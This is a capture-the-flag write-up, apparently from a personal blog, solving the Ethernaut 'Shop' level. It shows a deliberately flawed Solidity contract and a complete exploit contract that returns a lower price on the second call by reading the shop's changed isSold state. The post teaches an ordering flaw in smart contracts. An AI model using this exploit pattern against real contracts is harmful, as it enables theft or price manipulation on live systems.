###########################
Ethernaut 21: Shop
###########################
:date: 2023-10-25
:slug: ethernaut-21-shop
:summary: check-effects-interactions can bite you in the ass too
:tags: programming
:author: capu
:featured_image:


Objective
=========
Manage to *decrease* the ``price`` saved in the ``Shop``

Code
====
.. code-block:: solidity
    :linenos: inline

    interface Buyer {
        function price() external view returns (uint256);
    }

    contract Shop {
        uint256 public price = 100;
        bool public isSold;

        function buy() public {
            Buyer _buyer = Buyer(msg.sender);

            if (_buyer.price() >= price && !isSold) {
                isSold = true;
                price = _buyer.price();
            }
        }
    }

The ``Shop`` contract stores the current price of the object, and only lets you
buy it, that is, set its new price, if the price you report is greater than the
current one.

Solution
========
Normally I could deploy the same solution as for the `Elevator
<{filename}/2023-08-06-ethernaut-11-elevator.rst>`_ level, but that
relied on storing a value on the attacking contract's state in order to return a
different value in the first vs second call.

In this case, the ``Buyer`` interface specifies the ``price()`` function has
``view`` mutability. This means it'll be called with the `STATICCALL
<https://www.evm.codes/#fa?fork=shanghai>`_ opcode, which sets the EVM to revert
on state modifications.

Thing is, I can still return different values without modifying the attacker's
state, because the storage of the ``Shop`` does change between calls to
``price()``. Doing the effects *before* the interactions is what breaks this level
🙃

.. code-block:: solidity
    :linenos: inline
    :hl_lines: 3

    contract Hustler is Buyer {
        function price() external view returns (uint256){
            if(Shop(msg.sender).isSold()) return 90;
            return 110;
        }

        function attack(Shop shop) external {
            shop.buy();
        }
    }

.. code-block:: solidity
    :linenos: inline

    function solution(address payable target_) internal override{
        Shop target = Shop(target_);
        (new Hustler()).attack(target);
    }


